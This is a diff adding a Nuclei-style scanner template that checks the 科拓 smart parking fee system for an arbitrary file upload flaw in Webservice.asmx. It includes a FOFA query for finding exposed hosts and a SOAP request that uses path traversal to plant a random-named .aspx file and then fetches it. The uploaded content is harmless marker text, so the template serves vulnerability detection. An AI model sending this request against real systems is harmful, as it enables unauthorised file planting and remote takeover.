@@ -1,0 +1,50 @@
+id: ketuo-Webservice-fileupload
+
+info:
+  name: 科拓全智能停车收费系统 Webservice.asmx 任意文件上传漏洞
+  author: fgz
+  severity: critical
+  description: |
+    科拓全智能停车收费系统是科拓股份针对商业业态停车场提供的停车收费管理解决方案，结合车牌视频识别技术和移动支付技术，为商业停车场提供具有突出优势的“智能硬件+管理平台+应用系统"一站式解决方案，能够切实满足商业业态停车场运营管理的特定需求。该系统Webservice.asmx 接口处存在任意文件上传漏洞，可能会导致系统被黑客远控，请及时修复。
+  metadata:
+    max-request: 1
+    fofa-query: body="/KT_Css/qd_defaul.css"
+    verified: true
+  tags: 科拓全智能停车收费系统
+
+variables:
+  file_name: "{{to_lower(rand_text_alpha(8))}}"
+  file_content: "{{to_lower(rand_text_alpha(20))}}"
+  rboundary: "{{to_lower(rand_text_alpha(32))}}"
+
+http:
+  - raw:
+      - |
+        POST /Webservice.asmx HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.62 Safari/537.36
+        Content-Type: text/xml
+
+        <?xml version="1.0" encoding="utf-8"?>
+        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+        <soap:Body>
+        <UploadResume xmlns="http://tempuri.org/">
+        <ip>1</ip>
+        <fileName>../../../../{{file_name}}.aspx</fileName>
+        <fileFlow>{{base64(file_content)}}</fileFlow>
+        <tag>3</tag>
+        </UploadResume>
+        </soap:Body>
+        </soap:Envelope>
+
+      - |
+        GET /{{file_name}}.aspx HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+        Accept-Encoding: gzip
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code_1 == 200 && status_code_2 == 200 && contains(body_2, '{{file_content}}')"
